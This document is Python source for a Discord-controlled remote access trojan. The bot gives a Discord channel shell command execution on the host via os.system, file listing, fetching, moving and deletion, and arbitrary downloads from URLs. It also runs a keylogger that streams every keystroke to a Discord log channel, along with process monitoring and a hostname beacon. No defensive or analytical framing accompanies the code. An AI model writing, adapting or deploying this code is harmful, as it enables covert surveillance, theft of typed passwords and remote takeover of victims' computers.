import discord
from discord.ext import tasks
import config
from discord.ext import commands
import os
import socket
from pynput import keyboard
import psutil
from urllib import request

intents = discord.Intents.default()
bot = commands.Bot(command_prefix='$', intents=intents)

#Global Var
infochannel = config.INFOCHANNEL
log=config.LOG
app= config.APP
currentdic = "c:\\"
processes = []

#Methods
def lsSys():
    output = ""
    ls = os.listdir(currentdic)
    for x in ls:
        output += x + "\n"
    return output

def cdSys(arg1):
    global currentdic
    currentdic = arg1
    return currentdic

async def sendkey(key):
    channel = bot.get_channel(log)
    await channel.send(key)

def on_press(key):
    bot.loop.create_task(sendkey(key=key))

listener = keyboard.Listener(on_press=on_press)

def move(arg1, arg2):
    os.replace(arg1, arg2)

def removefile(arg1):
    os.remove(arg1)

def removefolder(arg1):
    os.rmdir(arg1)

def dwl(arg1, arg2):
    remote_url = arg1
    local_file = arg2
    request.urlretrieve(remote_url, local_file)

def makefolder(arg1):
    os.mkdir(arg1)

#File System cmd
@bot.command(brief='', description='See all the files and folders in you current dictionary. The dictionary is set to C:\\ by default')
async def ls(ctx):
    await ctx.send("" + lsSys())

@bot.command(brief='[Path]', description='Change your current dictionary and always enter the full path')
async def cd(ctx, arg1):
    await ctx.send("" + cdSys(arg1))

@bot.command(brief='', description='Shows your current dictionary')
async def pwd(ctx):
    await ctx.send(currentdic)

@bot.command(brief='[Path]', description='Sends a file/image from the path you have entered. It is not possible to send a file which is larger then 9 Mb')
async def fetch(ctx, arg1):
    try:
        await ctx.send(file=discord.File(arg1))
    except:
        await ctx.send("File is to large to send")

@bot.command(brief='[Source] [Destination]', description='Moves a file from [Source] to [Destination]')
async def mv(ctx, arg1, arg2):
    try:
        move(arg1=arg1, arg2=arg2)
        await ctx.send("File was moved")
    except:
        await ctx.send("File couldn't be moved")

@bot.command(brief='[Path]', description='Deletes a file')
async def rm(ctx, arg1):
    if os.path.exists(arg1):
        removefile(arg1=arg1)
        await ctx.send("File was deleted")
    else:
       await ctx.send("File couldn't be deleted")    

@bot.command(brief='[Path]', description='Deletes a folder')
async def rmdir(ctx, arg1):
    if os.path.exists(arg1):
        removefolder(arg1=arg1)
        await ctx.send("Folder was deleted")
    else:
       await ctx.send("Folder couldn't be deleted")   

@bot.command(brief='[Path]', description='Creates a folder')
async def mkdir(ctx, arg1):
    if not os.path.exists(arg1):
        makefolder(arg1=arg1)
        await ctx.send("Folder was created")
    else:
       await ctx.send("Folder already exists")   

@bot.command(brief='[Command]', description='Executes a command on the default command line')
async def cmd(ctx, arg1):
    try:
        os.system(arg1)
        await ctx.send("Command was executed")
    except:
        await ctx.send("Comannd couldn't be executed")

@bot.command(brief='[SourceLink] [LocalDestination]', description='Downloads a file from [SourceLink] to [LocalDestination]')
async def download(ctx, arg1, arg2):
    try:
        dwl(arg1=arg1, arg2=arg2)
        await ctx.send("File was downloaded")
    except:
        await ctx.send("File couldn't be downloaded")

#Logger cmd

@bot.command(brief='[on/off]', description='Starts/Stops the logger')
async def logger(ctx, arg1):
    if arg1 == "on":
        listener.start()
    elif arg1 == "off":
        listener.stop()
    else:
        await ctx.send("Invalid Syntax")

#Process cmd

@bot.command(brief='[on/off]', description='Starts/Stops logging the processes')
async def process(ctx, arg1):
    if arg1 == "on":
        checkapp.start()
    elif arg1 == "off":
        checkapp.stop()
    else:
        await ctx.send("Invalid Syntax")

@bot.command(brief='', description='Sends all processes which are currently running')
async def nowrunning(ctx):
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            if processName:
                await ctx.send(processName)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

#Background Task

@tasks.loop(minutes=1)
async def checkapp():
    global processes
    tmp = []
    opened = []
    closed = []
    output = ""
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            tmp.append(processName)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    if tmp != processes:
        for item in processes:
            if item not in tmp:
                if item not in closed:
                    closed.append(item)
        for item in tmp:
            if item not in processes:
                if item not in opened:
                    opened.append(item)
        for item in opened:
            output += item + " was opened\n"
        for item in closed:
            output += item + " was closed\n"
        processes = tmp
        if output:
            await bot.get_channel(app).send(output)
        else:
            pass
    else:
        pass

@checkapp.before_loop
async def beforecheck():
    processes.clear()
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            processes.append(processName)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
#Events

@bot.event
async def on_ready():
    channel = bot.get_channel(infochannel)
    msg = "The Client was started on the device: " + socket.gethostname()
    checkapp.start()
    await channel.send(msg)

bot.run(config.TOKEN)
